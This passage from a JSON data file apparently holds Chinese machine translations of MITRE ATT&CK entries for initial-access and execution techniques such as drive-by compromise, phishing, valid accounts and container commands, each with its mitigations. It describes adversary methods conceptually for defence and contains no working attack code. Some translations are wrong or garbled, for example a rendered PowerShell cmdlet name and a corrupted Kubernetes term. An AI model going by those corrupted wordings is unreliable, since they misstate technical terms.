                            "type": "text",
                            "content": "考虑阻止下载/传输和执行已知在敌方战役中使用的可能不常见的文件类型。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1189",
        "name": "Drive-by Compromise",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以通过用户在正常浏览过程中访问网站来访问系统。使用这种技术，用户的网络浏览器通常是被利用的目标，但对手也可能使用受损的网站进行非利用行为，例如获取应用程序访问令牌。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "存在多种将漏洞代码传递到浏览器的方式（即“目标驱动”），包括："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "当对手注入某种形式的恶意代码，如JavaScript、iFrame和跨站点脚本时，合法网站就会受到威胁"
                },
                {
                    "type": "list",
                    "content": "从可公开写入的云存储桶提供给合法网站的脚本文件被对手修改"
                },
                {
                    "type": "list",
                    "content": "恶意广告通过合法的广告提供商付费并提供服务（即恶意广告）"
                },
                {
                    "type": "list",
                    "content": "内置的web应用程序接口用于插入任何其他类型的对象，这些对象可用于显示web内容或包含在访问客户端上执行的脚本（例如论坛帖子、评论和其他用户可控的web内容）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "通常，对手使用的网站是特定社区访问的网站，如政府、特定行业或地区，其目标是基于共同利益损害特定用户或一组用户。这种有针对性的战役通常被称为战略性的网络妥协或水坑攻击。这种情况有几个已知的例子。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "典型的折衷驱动过程："
                }
            ],
            [
                {
                    "type": "text",
                    "content": "与利用面向公众的应用程序不同，该技术的重点是在访问网站时利用客户端上的软件。这通常会让对手访问内部网络上的系统，而不是DMZ中的外部系统。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人还可能使用受损的网站将用户交付给恶意应用程序，该恶意应用程序旨在窃取应用程序访问令牌（如OAuth令牌），以获得对受保护应用程序和信息的访问权限。这些恶意应用程序是通过合法网站上的弹出窗口提供的。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "浏览器沙盒可以用来减轻利用的一些影响，但沙盒逃逸可能仍然存在。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "其他类型的虚拟化和应用程序细分也可以减轻客户端利用的影响。这些类型的系统可能仍然存在额外利用的风险和实施中的弱点。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "查找利用漏洞期间使用的行为的安全应用程序，如Windows Defender Exploit Guard（WDEG）和增强型缓解体验工具包（EMET），可用于缓解某些利用行为。控制流完整性检查是另一种可能识别和阻止软件利用的方法。其中许多保护取决于体系结构和目标应用程序二进制文件的兼容性。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对于通过广告提供的恶意代码，广告拦截程序可以从一开始就帮助阻止该代码的执行。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "脚本阻塞扩展可以帮助阻止在利用过程中通常使用的JavaScript的执行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有浏览器和插件都保持更新，这有助于防止该技术的漏洞利用阶段。使用启用了安全功能的现代浏览器。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图利用面向互联网的主机或系统中的弱点来初始访问网络。系统的弱点可能是软件错误、临时故障或配置错误。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "被利用的应用程序通常是网站/web服务器，但也可以包括数据库（如SQL）、标准服务（如SMB或SSH）、网络设备管理和管理协议（如SNMP和Smart Install），以及任何其他具有Internet可访问开放套接字的系统。根据被利用的缺陷，这也可能涉及利用防御规避。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果应用程序托管在基于云的基础设施上和/或被容器化，那么利用它可能会导致底层实例或容器的损坏。这可以为对手提供访问云或容器API的路径，通过Escape to host利用容器主机访问，或利用薄弱的身份和访问管理策略。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能利用边缘网络基础设施和相关设备，特别是针对不支持强大的基于主机的防御的设备。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对于网站和数据库，OWASP前10名和CWE前25名突出了最常见的基于web的漏洞。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序隔离将限制被利用的目标可以访问的其他进程和系统功能。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "Web应用程序防火墙可用于限制应用程序的暴露，以防止利用流量到达应用程序。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "分段面向外部的服务器和服务，这些服务器和服务来自具有DMZ或独立托管基础设施的网络的其他部分。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对服务帐户使用最低权限将限制被利用的进程在系统其他部分上获得的权限。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过对外部暴露的应用程序使用补丁管理，定期更新软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1016",
                "name": "漏洞扫描",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期扫描面向外部的系统中的漏洞，并制定程序，在通过扫描和公开披露发现关键漏洞时快速修补系统。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1133",
        "name": "External Remote Services",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以利用面向外部的远程服务来初始访问和/或在网络中持续存在。VPN、Citrix和其他访问机制等远程服务允许用户从外部位置连接到内部企业网络资源。通常有远程服务网关来管理这些服务的连接和凭据身份验证。Windows远程管理和VNC等服务也可以在外部使用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "访问有效帐户以使用该服务通常是一项要求，可以通过凭证制药或在破坏企业网络后从用户那里获得凭证来获得。对远程服务的访问可以用作操作期间的冗余或持久访问机制。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "也可以通过不需要身份验证的公开服务获得访问权限。在容器化环境中，这可能包括公开的Docker API、Kubernetes API服务器、kubelet或web应用程序，如Kubernetesdashboard。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用或阻止可能不必要的远程可用服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制通过集中管理的集中器（如VPN和其他管理的远程访问系统）访问远程服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对远程服务帐户使用强大的双因素或多因素身份验证，以降低对手利用被盗凭据的能力，但要注意某些双因素身份验证实现的多因素身份拦截技术。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝通过使用网络代理、网关和防火墙直接远程访问内部系统。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1200",
        "name": "Hardware Additions",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "1.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会将计算机配件、网络硬件或其他计算设备引入系统或网络，这些设备可以用作获取访问权限的载体。不仅仅是通过可移动存储连接和分发有效负载（即通过可移动介质进行复制），还可以使用更强大的硬件添加来将新的功能和/或特性引入系统，然后这些功能或特性可能会被滥用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "虽然威胁参与者使用的公开参考文献很少，但许多红队/渗透测试人员利用硬件添加进行初始访问。商业和开源产品可以利用被动网络窃听、网络流量修改（即中间的对抗）、按键注入、通过DMA读取内核内存、添加对现有网络的新无线访问等功能。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "建立网络访问控制策略，例如使用设备证书和802.1x标准。将DHCP的使用限制在已注册的设备上，以防止未注册的设备与受信任的系统通信。"
                        }
                    ]
                ]
            },
            {
                "id": "M1034",
                "name": "限制硬件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过端点安全配置和监控代理阻止未知设备和附件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1566",
        "name": "Phishing",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [
            {
                "id": "T1566.001",
                "name": "Spearphishing Attachment"
            },
            {
                "id": "T1566.002",
                "name": "Spearphishing Link"
            },
            {
                "id": "T1566.003",
                "name": "Spearphishing via Service"
            },
            {
                "id": "T1566.004",
                "name": "Spearphishing Voice"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会发送网络钓鱼消息以访问受害者系统。所有形式的网络钓鱼都是以电子方式提供的社会工程。网络钓鱼可以成为攻击目标，称为鱼叉式网络钓鱼。在鱼叉式网络钓鱼中，特定的个人、公司或行业将成为对手的目标。更普遍地说，对手可以进行非针对性的网络钓鱼，例如在大规模恶意软件垃圾邮件活动中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "攻击者可能会向受害者发送包含恶意附件或链接的电子邮件，通常是为了在受害者系统上执行恶意代码。网络钓鱼也可以通过第三方服务进行，如社交媒体平台。网络钓鱼还可能涉及社会工程技术，如冒充可信来源，以及规避技术，如从被滥用发送消息的受损帐户中删除或操纵电子邮件或元数据/标头（如电子邮件隐藏规则）。另一种实现这一点的方法是伪造或伪造发送者的身份，这可以用来欺骗人类接收者和自动安全工具。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "受害者还可能收到钓鱼消息，指示他们拨打电话号码，以便访问恶意URL、下载恶意软件或在计算机上安装对手可访问的远程管理工具（即用户执行）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1049",
                "name": "防病毒/反恶意软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防病毒可以自动隔离可疑文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1031",
                "name": "网络入侵防护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "网络入侵预防系统和旨在扫描和删除恶意电子邮件附件或链接的系统可用于阻止活动。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确定可用于网络钓鱼的某些网站或附件类型（例如：.scr、.exe、.pif、.cpl等）是否对业务运营是必要的，如果活动无法很好地监控或构成重大风险，则考虑阻止访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用反欺骗和电子邮件身份验证机制，根据发件人域的有效性检查（使用SPF）和邮件的完整性（使用DKIM）过滤邮件。在组织内启用这些机制（通过DMARC等策略）可以使收件人（组织内和跨域）执行类似的消息过滤和验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "用户可以接受识别社会工程技术和网络钓鱼电子邮件的培训。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1091",
        "name": "Replication Through Removable Media",
        "tactics": [
            {
                "id": "TA0008",
                "name": "Lateral Movement"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "通过将恶意软件复制到可移动媒体，并在媒体插入系统并执行时利用自动运行功能，敌人可能会转移到系统上，可能是那些处于断开连接或空气间隙网络上的系统。在横向移动的情况下，这可能是通过修改存储在可移动媒体上的可执行文件，或者通过复制恶意软件并将其重命名为合法文件来诱骗用户在单独的系统上执行。在初始访问的情况下，这可能通过手动操作介质、修改用于初始格式化介质的系统或修改介质的固件本身来实现。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果通过USB连接，移动设备也可能被用来感染带有恶意软件的PC。这种感染可以使用设备（Android、iOS等）实现，在某些情况下，还可以使用USB充电电缆。例如，当智能手机连接到系统时，其安装方式可能类似于USB连接的磁盘驱动器。如果移动设备上存在与连接的系统兼容的恶意软件，则该恶意软件可能会感染机器（尤其是在启用了自动运行功能的情况下）。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击表面（ASR）规则以阻止未签名/不受信任的可执行文件（如.exe、.dll或.scr）从USB可移动驱动器运行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果不需要，请禁用“自动运行”。如果业务运营不需要可移动媒体，则在组织策略级别上禁止或限制可移动媒体。"
                        }
                    ]
                ]
            },
            {
                "id": "M1034",
                "name": "限制硬件安装",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制在网络中使用USB设备和可移动媒体。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1195",
        "name": "Supply Chain Compromise",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [
            {
                "id": "T1195.001",
                "name": "Compromise Software Dependencies and Development Tools"
            },
            {
                "id": "T1195.002",
                "name": "Compromise Software Supply Chain"
            },
            {
                "id": "T1195.003",
                "name": "Compromise Hardware Supply Chain"
            }
        ],
        "version": "1.5",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能在最终消费者收到产品或产品交付机制之前操纵产品或产品，以达到数据或系统泄露的目的。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "供应链妥协可能发生在供应链的任何阶段，包括："
                }
            ],
            [
                {
                    "type": "list",
                    "content": "开发工具的操作"
                },
                {
                    "type": "list",
                    "content": "开发环境的操纵"
                },
                {
                    "type": "list",
                    "content": "源代码存储库的操作（公共或私有）"
                },
                {
                    "type": "list",
                    "content": "开源依赖关系中的源代码操作"
                },
                {
                    "type": "list",
                    "content": "软件更新/分发机制的操作"
                },
                {
                    "type": "list",
                    "content": "受损/受感染的系统映像（多个可移动介质在工厂感染）"
                },
                {
                    "type": "list",
                    "content": "用修改后的版本替换合法软件"
                },
                {
                    "type": "list",
                    "content": "向合法经销商销售改装/假冒产品"
                },
                {
                    "type": "list",
                    "content": "货物拦截"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "虽然供应链妥协可能会影响硬件或软件的任何组件，但希望获得执行权的对手往往会在软件分发或更新渠道中对合法软件进行恶意添加。目标定位可能是特定于所需的受害者集，或者恶意软件可能会分发给广泛的消费者，但只会针对特定受害者采取额外的策略。在许多应用程序中用作依赖项的流行开源项目也可能成为向依赖项用户添加恶意代码的一种手段。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应实施补丁管理流程，以检查未使用的依赖项、未维护的和/或以前易受攻击的依赖项，不必要的功能、组件、文件和文档。"
                        }
                    ]
                ]
            },
            {
                "id": "M1016",
                "name": "漏洞扫描",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "还应持续监测漏洞来源，并使用自动和手动代码审查工具。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1199",
        "name": "Trusted Relationship",
        "tactics": [
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [],
        "version": "2.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会破坏或以其他方式利用能够接触到预期受害者的组织。通过可信的第三方关系进行的访问滥用了现有的连接，与获得网络访问的标准机制相比，该连接可能不受保护或受到的审查更少。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "组织通常授予第二或第三方外部提供商更高的访问权限，以允许他们管理内部系统以及基于云的环境。这些关系的一些例子包括IT服务承包商、托管安全提供商、基础设施承包商（如暖通空调、电梯、物理安全）。第三方提供商的访问可能仅限于所维护的基础设施，但可能与企业的其他部分存在于同一网络上。因此，另一方用于访问内部网络系统的有效帐户可能会被泄露和使用。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Office 365环境中，组织可以授予Microsoft合作伙伴或经销商委派的管理员权限。通过损害合作伙伴或经销商帐户，对手可能能够利用现有的委托管理员关系或向客户端发送新的委托管理员报价，以获得对受害租户的管理控制权。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "要求所有委派的管理员帐户使用MFA。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "网络分段可用于隔离不需要广泛网络访问的基础设施组件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "正确管理信任关系中各方使用的帐户和权限，以最大限度地减少该方的潜在滥用，以及该方是否受到对手的威胁。在Office 365环境中，可以在“合作伙伴关系”页面下查看合作伙伴关系和角色。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1078",
        "name": "Valid Accounts",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [
            {
                "id": "T1078.001",
                "name": "Default Accounts"
            },
            {
                "id": "T1078.002",
                "name": "Domain Accounts"
            },
            {
                "id": "T1078.003",
                "name": "Local Accounts"
            },
            {
                "id": "T1078.004",
                "name": "Cloud Accounts"
            }
        ],
        "version": "2.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会获取并滥用现有帐户的凭据，以此作为获得初始访问、持久性、特权提升或防御规避的手段。泄露的凭证可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access、网络设备和远程桌面。泄露的证书还可以向对手授予对特定系统的增加的特权或对网络的受限区域的访问。敌人可能会选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，从而更难检测到它们的存在。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，对手可能会滥用非活动帐户：例如，那些属于不再是组织成员的个人的帐户。使用这些帐户可能会使对手逃避检测，因为原始帐户用户将不会在场以识别其帐户上发生的任何异常活动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "本地、域和云帐户在系统网络上的权限重叠令人担忧，因为对手可能能够在帐户和系统之间切换，以达到高级别的访问（即域或企业管理员），从而绕过企业内设置的访问控制。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1036",
                "name": "帐户使用策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用条件访问策略阻止来自不兼容设备或来自定义的组织IP范围之外的登录。"
                        }
                    ]
                ]
            },
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用不支持MFA的传统身份验证，并要求使用现代身份验证协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保应用程序不会不安全地存储敏感数据或凭据。（例如，代码中的明文凭据、存储库中已发布的凭据或公共云存储中的凭据）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即进行更改。在可能的情况下，应定期更新使用SSH密钥的应用程序，并确保其安全。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "策略应尽量减少（如果不能消除的话）不同用户帐户之间密码的重复使用，尤其是对可能不受企业安全资源保护的个人帐户使用相同凭据的员工。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核用户帐户的活动，并停用或删除任何不再需要的帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序可以发送推送通知以验证作为多因素身份验证（MFA）形式的登录。培训用户只接受有效的推送通知并报告可疑的推送消息。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1651",
        "name": "Cloud Administration Command",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用云管理服务在虚拟机或混合连接设备内执行命令。AWS Systems Manager、Azure RunCommand和Runbook等资源允许用户通过利用已安装的虚拟机代理在虚拟机中远程运行脚本。同样，在Azure AD环境中，Microsoft Endpoint Manager允许全局或Intune管理员在加入Azure AD的本地设备上以SYSTEM的身份运行脚本。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "如果对手获得了对云环境的管理访问权限，他们可能会滥用云管理服务在环境的虚拟机或本地混合连接设备中执行命令。此外，损害服务提供商或代理管理员帐户的对手可能同样能够利用可信关系在连接的虚拟机中执行命令。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制有权在虚拟机上远程执行命令的云帐户的数量，并确保这些帐户不用于日常操作。在Azure中，限制具有Azure Virtual Machine Contributor及以上角色的帐户数量，并考虑使用临时实时（JIT）角色，以避免永久分配对虚拟机的特权访问。在Azure AD中，将全局和Intune管理员的数量限制为仅限所需的管理员。在AWS中，限制有权执行"
                        },
                        {
                            "type": "code",
                            "content": "ssm:SendCommand"
                        },
                        {
                            "type": "text",
                            "content": "操作的用户，并使用标签限制用户可以在其上执行命令的机器数量。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [
            {
                "id": "T1059.001",
                "name": "PowerShell"
            },
            {
                "id": "T1059.002",
                "name": "AppleScript"
            },
            {
                "id": "T1059.003",
                "name": "Windows Command Shell"
            },
            {
                "id": "T1059.004",
                "name": "Unix Shell"
            },
            {
                "id": "T1059.005",
                "name": "Visual Basic"
            },
            {
                "id": "T1059.006",
                "name": "Python"
            },
            {
                "id": "T1059.007",
                "name": "JavaScript"
            },
            {
                "id": "T1059.008",
                "name": "Network Device CLI"
            },
            {
                "id": "T1059.009",
                "name": "Cloud API"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用命令和脚本解释器来执行命令、脚本或二进制文件。这些接口和语言提供了与计算机系统交互的方式，并且是许多不同平台的共同特征。大多数系统都具有一些内置的命令行界面和脚本功能，例如，macOS和Linux发行版包括一些Unix Shell，而Windows安装则包括Windows command Shell和PowerShell。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "还有Python等跨平台解释器，以及通常与JavaScript和Visual Basic等客户端应用程序相关联的解释器。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会以各种方式滥用这些技术作为执行任意命令的手段。命令和脚本可以嵌入初始访问有效载荷中，作为引诱文件或从现有C2下载的辅助有效载荷交付给受害者。敌人还可以通过交互式终端/外壳执行命令，以及利用各种远程服务来实现远程执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1049",
                "name": "防病毒/反恶意软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "防病毒可以用于自动隔离可疑文件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则，以防止Visual Basic和JavaScript脚本执行潜在的恶意下载内容。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在可能的情况下，只允许执行已签名的脚本。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用或移除任何不必要或未使用的外壳或口译员。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在适当的情况下使用应用程序控制。例如，PowerShell受限语言模式可用于限制对敏感或其他危险语言元素的访问，例如用于执行任意Windows API或文件的语言元素（例如，"
                        },
                        {
                            "type": "code",
                            "content": "添加类型"
                        },
                        {
                            "type": "text",
                            "content": "）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "当需要PowerShell时，请考虑将PowerShell执行策略限制为管理员。请注意，根据环境配置，有一些绕过PowerShell执行策略的方法。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "PowerShell JEA（Just Enough Administration）也可用于沙盒管理，并限制管理员/用户可以通过远程PowerShell会话执行的命令。"
                        }
                    ]
                ]
            },
            {
                "id": "M1021",
                "name": "限制基于Web的内容",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "脚本阻塞扩展可以帮助防止在利用过程中通常使用的脚本和HTA文件的执行。对于通过广告提供的恶意代码，广告拦截程序可以从一开始就帮助阻止该代码的执行。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1609",
        "name": "Container Administration Command",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用容器管理服务来执行容器内的命令。容器管理服务，如Docker守护进程、Kubernetes API服务器或kubelet，可以允许在环境中远程管理容器。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Docker中，对手可以在容器部署期间指定一个执行脚本或命令的入口点，也可以使用"
                },
                {
                    "type": "code",
                    "content": "Docker exec"
                },
                {
                    "type": "text",
                    "content": "等命令在运行的容器中执行命令。在Kubernetes中，如果对手有足够的权限，他们可以通过与Kubernetesneneneba API服务器kubelet的交互，或通过运行"
                },
                {
                    "type": "code",
                    "content": "kubectl exec"
                },
                {
                    "type": "text",
                    "content": "等命令，在集群中的容器中获得远程执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "从容器中移除不必要的工具和软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能使用只读容器、只读文件系统和最少的映像来阻止命令的执行。在可能的情况下，还可以考虑使用应用程序控制和软件限制工具（如SELinux提供的工具）来限制对容器中的文件、进程和系统调用的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将与容器服务的通信限制在受管理和安全的通道上，例如本地Unix套接字或通过SSH进行远程访问。通过禁用对Docker API和Kubernetes API服务器的未经身份验证的访问，要求安全端口访问以通过TLS与API通信。在部署在云环境中的Kubernetes集群中，使用本地云平台功能来限制允许访问API服务器的IP范围。在可能的情况下，考虑启用对Kubernetes API的实时（JIT）访问，以对访问施加额外的限制。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保默认情况下容器未以root身份运行。在Kubernetes环境中，考虑定义Pod安全标准，防止Pod运行特权容器，并使用"
                        },
                        {
                            "type": "code",
                            "content": "NodeRestriction"
                        },
                        {
                            "type": "text",
                            "content": "准入控制器拒绝kublet访问其所属节点之外的节点和Pod。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对容器服务强制执行身份验证和基于角色的访问控制，以将用户限制为所需的最低权限。使用Kubernetes时，请避免向用户授予通配符权限或将用户添加到"
                        },
                        {
                            "type": "code",
                            "content": "system:masters"
                        },
                        {
